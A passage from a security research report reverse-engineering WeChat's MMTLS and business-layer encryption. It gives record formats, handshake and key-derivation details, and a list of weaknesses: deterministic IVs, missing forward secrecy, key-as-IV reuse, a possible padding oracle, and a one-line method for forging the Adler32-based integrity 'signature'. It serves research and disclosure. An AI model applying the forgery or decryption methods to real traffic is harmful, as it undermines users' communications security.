MMTLS can go over various transports, we refer to an MMTLS packet as a unit of correspondence within MMTLS. Over Longlink, MMTLS packets can be split across multiple TCP packets. Over Shortlink, MMTLS packets are generally contained within an HTTP POST request or response body. 1 Each MMTLS packet contains one or more MMTLS records (which are similar in structure and purpose to TLS records). Records are units of messages that carry handshake data, application data, or alert/error message data within each MMTLS packet. 1A. MMTLS Records Records can be identified by different record headers, a fixed 3-byte sequence preceding the record contents. In particular, we observed 4 different record types, with the corresponding record headers: Handshake-Resumption Record 19 f1 04 Handshake Record 16 f1 04 Data Record 17 f1 04 Alert Record 15 f1 04 Handshake records contain metadata and the key establishment material needed for the other party to derive the same shared session key using Diffie-Hellman. Handshake-Resumption record contains sufficient metadata for “resuming” a previously established session, by re-using previously established key material. Data records can contain encrypted ciphertext that carries meaningful WeChat request data. Some Data packets simply contain an encrypted no-op heartbeat. Alert records signify errors or signify that one party intends to end a connection. In MMTLS, all non-handshake records are encrypted, but the key material used differs based on which stage of the handshake has been completed. Here is an annotated MMTLS packet from the server containing a Handshake record: Here is an example of a Data record sent from the client to the server: To give an example of how these records interact, generally the client and server will exchange Handshake records until the Diffie-Hellman handshake is complete and they have established shared key material. Afterwards, they will exchange Data records, encrypted using the shared key material. When either side wants to close the connection, they will send an Alert record. More illustrations of each record type’s usage will be made in the following section. 1B. MMTLS Extensions As MMTLS’ wire protocol is heavily modeled after TLS, we note that it has also borrowed the wire format of “TLS Extensions” to exchange relevant encryption data during the handshake. Specifically, MMTLS uses the same format as TLS Extensions for the Client to communicate their key share (i.e. the client’s public key) for Diffie-Hellman, similar to TLS 1.3’s key_share extension, and to communicate session data for session resumption (similar to TLS 1.3’s pre_shared_key extension). In addition, MMTLS has support for Encrypted Extensions, similar to TLS, but they are currently not used in MMTLS (i.e., the Encrypted Extensions section is always empty). 2. MMTLS Encryption This section describes the outer layer of encryption, that is, what keys and encryption functions are used to encrypt and decrypt the ciphertexts found in the “MMTLS Wire Format” section, and how the encryption keys are derived. The encryption and decryption at this layer occurs in the STN module, in a separate spawned “com.tencent.mm:push” 2 process on Android. The spawned process ultimately transmits and receives data over the network. The code for all of the MMTLS Encryption and MMTLS serialization were analyzed from the library libwechatnetwork.so. In particular, we studied the Crypt() function, a central function used for all encryption and decryption whose name we derived from debug logging code. We also hooked all calls to HKDF_Extract() and HKDF_Expand(), the OpenSSL functions for HKDF, in order to understand how keys are derived. When the “:push” process is spawned, it starts an event loop in HandshakeLoop(), which processes all outgoing and incoming MMTLS Records. We hooked all functions called by this event loop to understand how each MMTLS Record is processed. The code for this study, as well as the internal function addresses identified for the particular version of WeChat we studied, can be found in the Github repository. Figure 1: Network requests: MMTLS encryption connection over longlink and over shortlink. Each box is an MMTLS Record, and each arrow represents an “MMTLS packet” sent over either Longlink (i.e., a single TCP packet) or shortlink (i.e., in the body of HTTP POST). Once both sides have received the DH keyshare, all further records are encrypted. 2A. Handshake and key establishment In order for Business-layer Encryption to start sending messages and establish keys, it has to use the MMTLS Encryption tunnel. Since the key material for the MMTLS Encryption has to be established first, the handshakes in this section happen before any data can be sent or encrypted via Business-layer Encryption. The end goal of the MMTLS Encryption handshake discussed in this section is to establish a common secret value that is known only to the client and server. On a fresh startup of WeChat, it tries to complete one MMTLS handshake over Shortlink, and one MMTLS handshake over Longlink, resulting in two MMTLS encryption tunnels, each using different sets of encryption keys. For Longlink, after the handshake completes, the same Longlink (TCP) connection is kept open to transport future encrypted data. For Shortlink, the MMTLS handshake is completed in the first HTTP request-response cycle, then the first HTTP connection closes. The established keys are stored by the client and server, and when data needs to be sent over Shortlink, those established keys are used for encryption, then sent over a newly established Shortlink connection. In the remainder of this section, we describe details of the handshakes. ClientHello First, the client generates keypairs on the SECP256R1 elliptic curve. Note that these elliptic curve keys are entirely separate pairs from those generated in the Business-layer Encryption section. The client also reads some Resumption Ticket data from a file stored on local storage named psk.key, if it exists. The psk.key file is written to after the first ServerHello is received, so, on a fresh install of WeChat, the resumption ticket is omitted from the ClientHello. The client first simultaneously sends a ClientHello message (contained in a Handshake record) over both the Shortlink and Longlink. The first of these two handshakes that completes successfully is the one that the initial Business-layer Encryption handshake occurs over (details of Business-layer Encryption are discussed in Section 4). Both Shortlink and Longlink connections are used afterwards for sending other data. In both the initial Shortlink and Longlink handshake, each ClientHello packet contains the following data items: ClientRandom (32 bytes of randomness) Resumption Ticket data read from psk.key, if available Client public key An abbreviated version of the MMTLS ClientHello is shown below. 16 f1 04 (Handshake Record header) . . . 01 04 f1 (ClientHello) . . . 08 cd 1a 18 f9 1c . . . (ClientRandom) . . . 00 0c c2 78 00 e3 . . . (Resumption Ticket from psk.key) . . . 04 0f 1a 52 7b 55 . . . (Client public key) . . . Note that the client generates a separate keypair for the Shortlink ClientHello and the Longlink ClientHello. The Resumption Ticket sent by the client is the same on both ClientHello packets because it is always read from the same psk.key file. On a fresh install of WeChat, the Resumption Ticket is omitted since there is no psk.key file. ServerHello The client receives a ServerHello packet in response to each ClientHello packet. Each contains: A record containing ServerRandom and Server public key Records containing encrypted server certificate, new resumption ticket, and a ServerFinished message. An abbreviated version of the MMTLS ServerHello is shown below; a full packet sample with labels can be found in the annotated network capture. 16 f1 04 (Handshake Record header) . . . 02 04 f1 (ServerHello) . . . 2b a6 88 7e 61 5e 27 eb . . . (ServerRandom) . . . 04 fa e3 dc 03 4a 21 d9 . . . (Server public key) . . . 16 f1 04 (Handshake Record header) . . . b8 79 a1 60 be 6c . . . (ENCRYPTED server certificate) . . . 16 f1 04 (Handshake Record header) . . . 1a 6d c9 dd 6e f1 . . . (ENCRYPTED NEW resumption ticket) . . . 16 f1 04 (Handshake Record header) . . . b8 79 a1 60 be 6c . . . (ENCRYPTED ServerFinished) . . . On receiving the server public key, the client generates secret = ecdh(client_private_key, server_public_key). Note that since each MMTLS encrypted tunnel uses a different pair of client keys, the shared secret, and any derived keys and IVs will be different between MMTLS tunnels. This also means Longlink handshake and Shortlink handshake each compute a different shared secret. Then, the shared secret is used to derive several sets of cryptographic parameters via HKDF, a mathematically secure way to transform a short secret value into a long secret value. In this section, we will focus on the handshake parameters. Alongside each set of keys, initialization vectors (IVs) are also generated. The IV is a value that is needed to initialize the AES-GCM encryption algorithm. IVs do not need to be kept secret. However, they need to be random and not reused. The handshake parameters are generated using HKDF (“handshake key expansion” is a constant string in the program, as well as other monotype double quoted strings in this section): key_enc, key_dec, iv_enc, iv_dec = HKDF(secret, 56, “handshake key expansion”) Using key_dec and iv_dec, the client can decrypt the remainder of the ServerHello records. Once decrypted, the client validates the server certificate. Then, the client also saves the new Resumption Ticket to the file psk.key. At this point, since the shared secret has been established, the MMTLS Encryption Handshake is considered completed. To start encrypting and sending data, the client derives other sets of parameters via HKDF from the shared secret. The details of which keys are derived and used for which connections are fully specified in these notes where we annotate the keys and connections created on WeChat startup. 2B. Data encryption After the handshake, MMTLS uses AES-GCM with a particular key and IV, which are tied to the particular MMTLS tunnel, to encrypt data. The IV is incremented by the number of records previously encrypted with this key. This is important because re-using an IV with the same key destroys the confidentiality provided in AES-GCM, as it can lead to a key recovery attack using the known tag. ciphertext, tag = AES-GCM(input, key, iv+n) ciphertext = ciphertexttag The 16-byte tag is appended to the end of the ciphertext. This tag is authentication data computed by AES-GCM; it functions as a MAC in that when verified properly, this data provides authentication and integrity. In many cases, if this is a Data record being encrypted, input contains metadata and ciphertext that has already been encrypted as described in the Business-layer Encryption section. We separately discuss data encryption in Longlink and Shortlink in the following subsections. 2B1. Longlink Client-side Encryption for Longlink packets is done using AES-GCM with key_enc and iv_enc derived earlier in the handshake. Client-side Decryption uses key_dec and iv_dec. Below is a sample Longlink (TCP) packet containing a single data record containing an encrypted heartbeat message from the server 3: 17 f1 04 RECORD HEADER (of type “DATA”) 00 20RECORD LENGTH e6 55 7a d6 82 1d a7 f4 2b 83 d4 b7 78 56 18 f3 ENCRYPTED DATA 1b 94 27 e1 1e c3 01 a6 f6 23 6a bc 94 eb 47 39 TAG (MAC) Within a long-lived Longlink connection, the IV is incremented for each record encrypted. If a new Longlink connection is created, the handshake is restarted and new key material is generated. 2B2. Shortlink Shortlink connections can only contain a single MMTLS packet request and a single MMTLS packet response (via HTTP POST request and response, respectively). After the initial Shortlink ClientHello sent on startup, WeChat will send ClientHello with Handshake Resumption packets. These records have the header 19 f1 04 instead of the 16 f1 04 on the regular ClientHello/ServerHello handshake packets. An abbreviated sample of a Shortlink request packet containing Handshake Resumption is shown below. 19 f1 04 (Handshake Resumption Record header) . . . 01 04 f1 (ClientHello) . . . 9b c5 3c 42 7a 5b 1a 3b . . . (ClientRandom) . . . 71 ae ce ff d8 3f 29 48 . . . (NEW Resumption Ticket) . . . 19 f1 04 (Handshake Resumption Record header) . . . 47 4c 34 03 71 9e . . . (ENCRYPTED Extensions) . . . 17 f1 04 (Data Record header) . . . 98 cd 6e a0 7c 6b . . . (ENCRYPTED EarlyData) . . . 15 f1 04 (Alert Record header) . . . 8a d1 c3 42 9a 30 . . . (ENCRYPTED Alert (ClientFinished)) . . . Note that, based on our understanding of the MMTLS protocol, the ClientRandom sent in this packet is not used at all by the server, because there is no need to re-run Diffie-Hellman in a resumed session. The Resumption Ticket is used by the server to identify which prior-established shared secret should be used to decrypt the following packet content. Encryption for Shortlink packets is done using AES-GCM with the handshake parameters key_enc and iv_enc. (Note that, despite their identical name, key_enc and iv_enc here are different from those of the Longlink, since Shortlink and Longlink each complete their own handshake using different elliptic curve client keypair.) The iv_enc is incremented for each record encrypted. Usually, EarlyData records sent over Shortlink contain ciphertext that has been encrypted with Business-layer Encryption as well as associated metadata. This metadata and ciphertext will then be additionally encrypted at this layer. The reason this is referred to as EarlyData internally in WeChat is likely due to it being borrowed from TLS; typically, it refers to the data that is encrypted with a key derived from a pre-shared key, before the establishment of a regular session key via Diffie-Hellman. However, in this case, when using Shortlink, there is no data sent “after the establishment of a regular session key”, so almost all Shortlink data is encrypted and sent in this EarlyData section. Finally, ClientFinished indicates that the client has finished its side of the handshake. It is an encrypted Alert record with a fixed message that always follows the EarlyData Record. From our reverse-engineering, we found that the handlers for this message referred to it as ClientFinished. 3. Business-layer Request MMTLS Data Records either carry an “Business-layer request” or heartbeat messages. In other words, if one decrypts the payload from an MMTLS Data Record, the result will often be messages described below. This Business-layer request contains several metadata parameters that describe the purpose of the request, including the internal URI and the request type number, which we briefly described in the “Launching a WeChat network request” section. When logged-in, the format of a Business-layer request looks like the following: 00 00 00 7b (total data length) 00 24 (URI length) /cgi-bin/micromsg-bin/... (URI) 00 12 (hostname length) sgshort.wechat.com (hostname) 00 00 00 3D (length of rest of data) BF B6 5F (request flags) 41 41 41 41 (user ID) 42 42 42 42 (device ID) FC 03 48 02 00 00 00 00 (cookie) 1F 9C 4C 24 76 0E 00 (cookie) D1 05 varint (request_type) 0E 0E 00 02 (4 more varints) BD 95 80 BF 0D varint (signature) FE (flag) 80 D2 89 91 04 00 00 (marks start of data) 08 A6 29 D1 A4 2A CA F1 ... (ciphertext) Responses are formatted very similarly: bf b6 5f (flags) 41 41 41 41 (user ID) 42 42 42 42 (device ID) fc 03 48 02 00 00 00 00 (cookie) 1f 9c 4c 24 76 0e 00 (cookie) fb 02 varint (request_type) 35 35 00 02 varints a9 ad 88 e3 08 varint (signature) fe ba da e0 93 04 00 00 (marks start of data) b6 f8 e9 99 a1 f4 d1 20 . . . ciphertext This request then contains another encrypted ciphertext, which is encrypted by what we refer to as Business-layer Encryption. Business-layer Encryption is separate from the system we described in the MMTLS Encryption section. The signature mentioned above is the output of genSignature(), which is discussed in the “Integrity check” section. Pseudocode for the serialization schemes and more samples of WeChat’s encrypted request header can be found in our Github repository. 4. Business-layer Encryption WeChat Crypto diagrams (inner layer) This section describes how the Business-layer requests described in Section 3 are encrypted and decrypted, and how the keys are derived. We note that the set of keys and encryption processes introduced in this section are completely separate from those referred to in the MMTLS Encryption section. Generally, for Business-layer Encryption, much of the protocol logic is handled in the Java code, and the Java code calls out to the C++ libraries for encryption and decryption calculations. Whereas for MMTLS Encryption everything is handled in C++ libraries, and occurs on a different process entirely. There is very little interplay between these two layers of encryption. The Business-layer Encryption has two modes using different cryptographic processes: Asymmetric Mode and Symmetric Mode. To transition into Symmetric Mode, WeChat needs to perform an Autoauth request. Upon startup, WeChat typically goes through the three following stages: Before the user logs in to their account, Business-layer Encryption first uses asymmetric cryptography to derive a shared secret via static Diffie-Hellman (static DH), then uses the shared secret as a key to AES-GCM encrypt the data. We name this Asymmetric Mode. In Asymmetric Mode, the client derives a new shared secret for each request. Using Asymmetric Mode, WeChat can send an Autoauth request, to which the server would return an Autoauth response, which contains a session_key. After the client obtains session_key, Business-layer Encryption uses it to AES-CBC encrypt the data. We name this Symmetric Mode since it only uses symmetric cryptography. Under Symmetric Mode, the same session_key can be used for multiple requests. For Asymmetric Mode, we performed dynamic and static analysis of C++ functions in libwechatmm.so; in particular the HybridEcdhEncrypt() and HybridEcdhDecrypt() functions, which call AesGcmEncryptWithCompress() / AesGcmDecryptWithUncompress(), respectively. For Symmetric Mode, the requests are handled in pack(), unpack(), and genSignature() functions in libMMProtocalJNI.so. Generally, pack() handles outgoing requests, and unpack() handles incoming responses to those requests. They also perform encryption/decryption. Finally, genSignature() computes a checksum over the full request. In the Github repository, we’ve uploaded pseudocode for pack, AES-CBC encryption, and the genSignature routine. The Business-layer Encryption is also tightly integrated with WeChat’s user authentication system. The user needs to log in to their account before the client is able to send an Autoauth request. For clients that have not logged in, they exclusively use Asymmetric Mode. For clients that have already logged in, their first Business-layer packet would most often be an Autoauth request encrypted using Asymmetric Mode, however, the second and onward Business-layer packets are encrypted using Symmetric Mode. Figure 2: Business-layer encryption, logged-out, logging-in, and logged-in: Swimlane diagrams showing at a high-level what Business-layer Encryption requests look like, including which secrets are used to generate the key material used for encryption. 🔑secret is generated via DH(static server public key, client private key), and 🔑new_secret is DH(server public key, client private key). 🔑session is decrypted from the first response when logged-in. Though it isn’t shown above, 🔑new_secret is also used in genSignature() when logged-in; this signature is sent with request and response metadata. 4A. Business-layer Encryption, Asymmetric Mode Before the user logs in to their WeChat account, the Business-layer Encryption process uses a static server public key, and generates new client keypair to agree on a static Diffie-Hellman shared secret for every WeChat network request. The shared secret is run through the HKDF function and any data is encrypted with AES-GCM and sent alongside the generated client public key so the server can calculate the shared secret. For each request, the client generates a public, private keypair for use with ECDH. We also note that the client has a static server public key pinned in the application. The client then calculates an initial secret. secret = ECDH(static_server_pub, client_priv) hash = sha256(client_pub) client_random =derived_key = HKDF(secret) derived_key is then used to AES-GCM encrypt the data, which we describe in detail in the next section. 4B. Business-layer Encryption, obtaining session_key If the client is logged-in (i.e., the user has logged in to a WeChat account on a previous app run), the first request will be a very large data packet authenticating the client to the server (referred to as Autoauth in WeChat internals) which also contains key material. We refer to this request as the Autoauth request. In addition, the client pulls a locally-stored key autoauth_key, which we did not trace the provenance of, since it does not seem to be used other than in this instance. The key for encrypting this initial request (authrequest_data) is derived_key, calculated in the same way as in Section 4A. The encryption described in the following is the Asymmetric Mode encryption, albeit a special case where the data is the authrequest_data. Below is an abbreviated version of a serialized and encrypted Autoauth request: 08 01 12 . . . [Header metadata] 04 46 40 96 4d 3e 3e 7e [client_publickey] . . . fa 5a 7d a7 78 e1 ce 10 . . . [ClientRandom encrypted w secret] a1 fb 0c da . . . [IV] 9e bc 92 8a 5b 81 . . . [tag] db 10 d3 0f f8 e9 a6 40 . . . [ClientRandom encrypted w autoauth_key] 75 b4 55 30 . . . [IV] d7 be 7e 33 a3 45 . . . [tag] c1 98 87 13 eb 6f f3 20 . . . [authrequest_data encrypted w derived_key] 4c ca 86 03 . . [IV] 3c bc 27 4f 0e 7b . . . [tag] A full sample of the Autoauth request and response at each layer of encryption can be found in the Github repository. Finally, we note that the autoauth_key above does not seem to be actively used outside of encrypting in this particular request. We suspect this is vestigial from a legacy encryption protocol used by WeChat. The client encrypts here using AES-GCM with a randomly generated IV, and uses a SHA256 hash of the preceding message contents as AAD. At this stage, the messages (including the ClientRandom messages) are always ZLib compressed before encryption. iv =compressed = zlib_compress(plaintext) ciphertext, tag = AESGCM_encrypt(compressed, aad = hash(previous), derived_key, iv) In the above, previous is the header of the request (i.e. all header bytes preceding the 04 00 00 marker of data start). The client appends the 12-byte IV, then the 16-byte tag, onto the ciphertext. This tag can be used by the server to verify the integrity of the ciphertext, and essentially functions as a MAC. 4B1. Obtaining session_key: Autoauth Response The response to autoauth is serialized similarly to the request: 08 01 12 . . . [Header metadata] 04 46 40 96 4d 3e 3e 7e [new_server_pub] . . . c1 98 87 13 eb 6f f3 20 . . . [authresponse_data encrypted w new_secret] 4c ca 86 03 . . [IV] 3c bc 27 4f 0e 7b . . . [tag] With the newly received server public key (new_server_pub), which is different from the static_server_pub hardcoded in the app, the client then derives a new secret (new_secret). new_secret is then used as the key to AES-GCM decrypt authresponse_data. The client can also verify authresponse_data with the given tag. new_secret = ECDH(new_server_pub, client_privatekey) authresponse_data= AESGCM_decrypt(aad = hash(authrequest_data), new_secret, iv) authresponse_data is a serialized Protobuf containing a lot of important data for WeChat to start, starting with a helpful “Everything is ok” status message. A full sample of this Protobuf can be found in the Github repository. Most importantly, authresponse_data contains session_key, which is the key used for future AES-CBC encryption under Symmetric Mode. From here on out, new_secret is only used in genSignature(), which is discussed below in Section 4C2 Integrity Check. We measured the entropy of the session_key provided by the server, as it is used for future encryption. This key exclusively uses printable ASCII characters, and is thus limited to around ~100 bits of entropy. The WeChat code refers to three different keys: client_session, server_session, and single_session. Generally, client_session refers to the client_publickey, server_session refers to the shared secret key generated using ECDH i.e. new_secret, and single_session refers to the session_key provided by the server. 4C. Business-layer Encryption, Symmetric Mode After the client receives session_key from the server, future data is encrypted using Symmetric Mode. Symmetric Mode encryption is mostly done using AES-CBC instead of AES-GCM, with the exception of some large files being encrypted with AesGcmEncryptWithCompress(). As AesGcmEncryptWithCompress() requests are the exception, we focus on the more common use of AES-CBC. Specifically, the Symmetric Mode uses AES-CBC with PKCS-7 padding, with the session_key as a symmetric key: ciphertext = AES-CBC(PKCS7_pad(plaintext), session_key, iv = session_key) This session_key is doubly used as the IV for encryption. 4C1. Integrity check In Symmetric Mode, a function called genSignature() calculates a pseudo-integrity code on the plaintext. This function first calculates the MD5 hash of WeChat’s assigned user ID for the logged-in user (uin), new_secret, and the plaintext length. Then, genSignature() uses Adler32, a checksumming function, on the MD5 hash concatenated with the plaintext. signature = adler32(md5(uin_secretplaintext_len)plaintext) The result from Adler32 is concatenated to the ciphertext as metadata (see Section 3A for how it is included in the request and response headers), and is referred to as a signature in WeChat’s codebase. We note that though it is referred to as a signature, it does not provide any cryptographic properties; details can be found in the Security Issues section. The full pseudocode for this function can also be found in the Github repository. 5. Protobuf data payload The input to Business-layer Encryption is generally a serialized Protobuf, optionally compressed with Zlib. When logged-in, many of the Protobufs sent to the server contain the following header data: \"1\": { \"1\": \"\\u0000\", \"2\": \"1111111111\", # User ID (assigned by WeChat) \"3\": \"AAAAAAAAAAAAAAA\\u0000\", # Device ID (assigned by WeChat) \"4\": \"671094583\", # Client Version \"5\": \"android-34\", # Android Version \"6\": \"0\" }, The Protobuf structure is defined in each API’s corresponding RR class, as we previously mentioned in the “Launching a WeChat network request” section. 6. Putting it all together In the below diagram, we demonstrate the network flow for the most common case of opening the WeChat application. We note that in order to prevent further complicating the diagram, HKDF derivations are not shown; for instance, when “🔑mmtls” is used, HKDF is used to derive a key from “🔑mmtls”, and the derived key is used for encryption. The specifics of how keys are derived, and which derived keys are used to encrypt which data, can be found in these notes. Figure 3: Swimlane diagram demonstrating the encryption setup and network flow of the most common case (user is logged in, opens WeChat application). We note that other configurations are possible. For instance, we have observed that if the Longlink MMTLS handshake completes first, the Business-layer “Logging-in” request and response can occur over the Longlink connection instead of over several shortlink connections. In addition, if the user is logged-out, Business-layer requests are simply encrypted with 🔑secret (resembling Shortlink 2 requests) Security issues In this section, we outline potential security issues and privacy weaknesses we identified with the construction of the MMTLS encryption and Business-layer encryption layers. There could be other issues as well. Issues with MMTLS encryption Below we detail the issues we found with WeChat’s MMTLS encryption. Deterministic IV The MMTLS encryption process generates a single IV once per connection. Then, they increment the IV for each subsequent record encrypted in that connection. Generally, NIST recommends not using a wholly deterministic derivation for IVs in AES-GCM since it is easy to accidentally re-use IVs. In the case of AES-GCM, reuse of the (key, IV) tuple is catastrophic as it allows key recovery from the AES-GCM authentication tags. Since these tags are appended to AES-GCM ciphertexts for authentication, this enables plaintext recovery from as few as 2 ciphertexts encrypted with the same key and IV pair. In addition, Bellare and Tackmann have shown that the use of a deterministic IV can make it possible for a powerful adversary to brute-force a particular (key, IV) combination. This type of attack applies to powerful adversaries, if the crypto system is deployed to a very large (i.e., the size of the Internet) pool of (key, IV) combinations being chosen. Since WeChat has over a billion users, this order of magnitude puts this attack within the realm of feasibility. Lack of forward secrecy Forward secrecy is generally expected of modern communications protocols to reduce the importance of session keys. Generally, TLS itself is forward-secret by design, except in the case of the first packet of a “resumed” session. This first packet is encrypted with a “pre-shared key”, or PSK established during a previous handshake. MMTLS makes heavy use of PSKs by design. Since the Shortlink transport format only supports a single round-trip of communication (via a single HTTP POST request and response), any encrypted data sent via the transport format is encrypted with a pre-shared key. Since leaking the shared `PSK_ACCESS` secret would enable a third-party to decrypt any EarlyData sent across multiple MMTLS connections, data encrypted with the pre-shared key is not forward secret. The vast majority of records encrypted via MMTLS are sent via the Shortlink transport, which means that the majority of network data sent by WeChat is not forward-secret between connections. In addition, when opening the application, WeChat creates a single long-lived Longlink connection. This long-lived Longlink connection is open for the duration of the WeChat application, and any encrypted data that needs to be sent is sent over the same connection. Since most WeChat requests are either encrypted using (A) a session-resuming PSK or (B) the application data key of the long-lived Longlink connection, WeChat’s network traffic often does not retain forward-secrecy between network requests. Issues with Business-layer encryption On its own, the business-layer encryption construction, and, in particular the Symmetric Mode, AES-CBC construction, has many severe issues. Since the requests made by WeChat are double-encrypted, and these concerns only affect the inner, business layer of encryption, we did not find an immediate way to exploit them. However, in older versions of WeChat which exclusively used business-layer encryption, these issues would be exploitable. Metadata leak Business-layer encryption does not encrypt metadata such as the user ID and request URI, as shown in the “Business-layer request” section. This issue is also acknowledged by the WeChat developers themselves to be one of the motivations to develop MMTLS encryption. Forgeable genSignature integrity check While the purpose of the genSignature code is not entirely clear, if it is being used for authentication (since the ecdh_key is included in the MD5) or integrity, it fails on both parts. A valid forgery can be calculated with any known plaintext without knowledge of the ecdh_key. If the client generates the following for some known plaintext message plaintext: sig = adler32(md5(uinecdh_keyplaintext_len)plaintext) We can do the following to forge the signature evil_sig for some evil_plaintext with length plaintext_len: evil_sig = sig - adler32(plaintext) + adler32(evil_plaintext) Subtracting and adding from adler32 checksums is achievable by solving for a system of equations when the message is short. Code for subtracting and adding to adler32 checksum, thereby forging this integrity check, can be found in adler.py in our Github repository. Possible AES-CBC padding oracle Since AES-CBC is used alongside PKCS7 padding, it is possible that the use of this encryption on its own would be susceptible to an AES-CBC padding oracle, which can lead to recovery of the encrypted plaintext. Earlier this year, we found that another custom cryptography scheme developed by a Tencent company was susceptible to this exact attack. Key, IV re-use in block cipher mode Re-using the key as the IV for AES-CBC, as well as re-using the same key for all encryption in a given session (i.e., the length of time that the user has the application opened) introduces some privacy issues for encrypted plaintexts. For instance, since the key and the IV provide all the randomness, re-using both means that if two plaintexts are identical, they will encrypt to the same ciphertext. In addition, due to the use of CBC mode in particular, two plaintexts with identical N block-length prefixes will encrypt to the same first N ciphertext blocks. Encryption key issues It is highly unconventional for the server to choose the encryption key used by the client. In fact, we note that the encryption key generated by the server (the “session key”) exclusively uses printable ASCII characters. Thus, even though the key is 128 bits long, the entropy of this key is at most 106 bits. No forward secrecy As mentioned in the previous section, forward-secrecy is a standard property for modern network communication encryption. When the user is logged-in, all communication with WeChat, at this encryption layer, is done with the exact same key. The client does not receive a new key until the user closes and restarts WeChat. Other versions of WeChat To confirm our findings, we also tested our decryption code on WeChat 8.0.49 for Android (released April 2024) and found that the MMTLS network format matches that used by WeChat 8.0.49 for iOS. Previous versions of WeChat network encryption To understand how WeChat’s complex cryptosystems are tied together, we also briefly reverse-engineered an older version of WeChat that did not utilize MMTLS. The newest version of WeChat that did not utilize MMTLS was v6.3.16, released in 2016. Our full notes on this reverse-engineering can be found here. While logged-out, requests were largely using the Business-layer Encryption cryptosystem, using RSA public-key encryption rather than static Diffie-Hellman plus symmetric encryption via AES-GCM. We observed requests to the internal URIs cgi-bin/micromsg-bin/encryptcheckresupdate and cgi-bin/micromsg-bin/getkvidkeystrategyrsa. There was also another encryption mode used, DES with a static key. This mode was used for sending crash logs and memory stacks; POST requests to the URI /cgi-bin/mmsupport-bin/stackreport were encrypted using DES. We were not able to login to this version for dynamic analysis, but from our static analysis, we determined that the encryption behaves the same as Business-layer Encryption when logged-in (i.e. using a session_key provided by the server for AES-CBC encryption). Discussion Why does Business-layer encryption matter? Since Business-layer encryption is wrapped in MMTLS, why should it matter whether or not it is secure? First, from our study of previous versions of WeChat, Business-layer encryption was the sole layer of encryption for WeChat network requests until 2016. Second, from the the fact that Business-layer encryption exposes internal request URI unencrypted, one of the possible architectures for WeChat would be to host different internal servers to handle different types of network requests (corresponding to different “requestType” values and different cgi-bin request URLs). It could be the case, for instance, that after MMTLS is terminated at the front WeChat servers (handles MMTLS decryption), the inner WeChat request that is forwarded to the corresponding internal WeChat server is not re-encrypted, and therefore solely encrypted using Business-layer encryption. A network eavesdropper, or network tap, placed within WeChat’s intranet could then attack the Business-layer encryption on these forwarded requests. However, this scenario is purely conjectural. Tencent’s response to our disclosure is concerned with issues in Business-layer encryption and implies they are slowly migrating from the more problematic AES-CBC to AES-GCM, so Tencent is also concerned with this. Why not use TLS? According to public documentation and confirmed by our own findings, MMTLS (the “Outer layer” of encryption) is based heavily on TLS 1.3. In fact, the document demonstrates that the architects of MMTLS have a decent understanding of asymmetric cryptography in general. The document contains reasoning for not using TLS. It explains that the way WeChat uses network requests necessitates something like 0-RTT session resumption, because the majority of WeChat data transmission needs only one request-response cycle (i.e., Shortlink). MMTLS only required one round-trip handshake to establish the underlying TCP connection before any application data can be sent; according to this document, introducing another round-trip for the TLS 1.2 handshake was a non-starter. Fortunately, TLS1.3 proposes a 0-RTT (no additional network delay) method for the protocol handshake. In addition, the protocol itself provides extensibility through the version number, CipherSuite, and Extension mechanisms. However, TLS1.3 is still in draft phases, and its implementation may still be far away. TLS1.3 is also a general-purpose protocol for all apps, given the characteristics of WeChat, there is great room for optimization. Therefore, at the end, we chose to design and implement our own secure transport protocol, MMTLS, based on the TLS1.3 draft standard. [originally written in Chinese] However, even at the time of writing in 2016, TLS 1.2 did provide an option for session resumption. In addition, since WeChat controls both the servers and the clients, it doesn’t seem unreasonable to deploy the fully-fledged TLS 1.3 implementations that were being tested at the time, even if the IETF draft was incomplete. Despite the architects of MMTLS’ best effort, generally, the security protocols used by WeChat seem both less performant and less secure than TLS 1.3. Generally speaking, designing a secure and performant transport protocol is no easy feat. The issue of performing an extra round-trip for a handshake has been a perennial issue for application developers. The TCP and TLS handshake each require a single round-trip, meaning each new data packet sent requires two round-trips. Today, TLS-over-QUIC combines the transport-layer and encryption-layer handshakes, requiring only a single handshake. QUIC provides the best of both worlds, both strong, forward-secret encryption, and halving the number of round-trips needed for secure communication. Our recommendation would be for WeChat to migrate to a standard QUIC implementation. Finally, there is also the issue of client-side performance, in addition to network performance. Since WeChat’s encryption scheme performs two layers of encryption per request, the client is performing double the work to encrypt data, than if they used a single standardized cryptosystem. The trend of home-rolled cryptography in Chinese applications The findings here contribute to much of our prior research that suggests the popularity of home-grown cryptography in Chinese applications. In general, the avoidance of TLS and the preference for proprietary and non-standard cryptography is a departure from cryptographic best practices. While there may have been many legitimate reasons to distrust TLS in 2011 (like EFF and Access Now’s concerns over the certificate authority ecosystem), the TLS ecosystem has largely stabilized since then, and is more auditable and transparent. Like MMTLS, all the proprietary protocols we have researched in the past contain weaknesses relative to TLS, and, in some cases, could even be trivially decrypted by a network adversary. This is a growing, concerning trend unique to the Chinese security landscape as the global Internet progresses towards technologies like QUIC or TLS to protect data in transit. Anti-DNS-hijacking mechanisms Similar to how Tencent wrote their own cryptographic system, we found that in Mars they also wrote a proprietary domain lookup system. This system is part of STN and has the ability to support domain name to IP address lookups over HTTP. This feature is referred to as “NewDNS” in Mars. Based on our dynamic analysis, this feature is regularly used in WeChat. At first glance, NewDNS duplicates the same functions already provided by DNS (Domain Name System), which is already built into nearly all internet-connected devices. WeChat is not the only app in China that utilizes such a system. Major cloud computing providers in China such as Alibaba Cloud and Tencent Cloud both offer their own DNS over HTTP service. A VirusTotal search for apps that tries to contact Tencent Cloud’s DNS over HTTP service endpoint (119.29.29.98) yielded 3,865 unique results. One likely reason for adopting such a system is that ISPs in China often implement DNS hijacking to insert ads and redirect web traffic to perform ad fraud. The problem was so serious that six Chinese internet giants issued a joint statement in 2015 urging ISPs to improve. According to the news article, about 1–2% of traffic to Meituan (an online shopping site) suffers from DNS hijacking. Ad fraud by Chinese ISPs seems to remain a widespread problem in recent years. Similar to their MMTLS cryptographic system, Tencent’s NewDNS domain lookup system was motivated by trying to meet the needs of the Chinese networking environment. DNS proper over the years has proven to have multiple security and privacy issues. Compared to TLS, we found that WeChat’s MMTLS has additional deficiencies. However, it remains an open question as to, when compared to DNS proper, whether NewDNS is more or less problematic. We leave this question for future work. Use of Mars STN outside WeChat We speculate that there is a widespread adoption of Mars (mars-open) outside of WeChat, based on the following observations: There are numerous issues opened on the Mars GitHub repository. There are plenty of technical articles outlining building instant messaging systems using Mars. There is already a white-label instant messaging system product that is based on Mars. The adoption of Mars outside of WeChat is concerning because Mars by default does not provide any transport encryption. As we have mentioned in the “Three Parts of Mars” section, the MMTLS encryption used in WeChat is part of 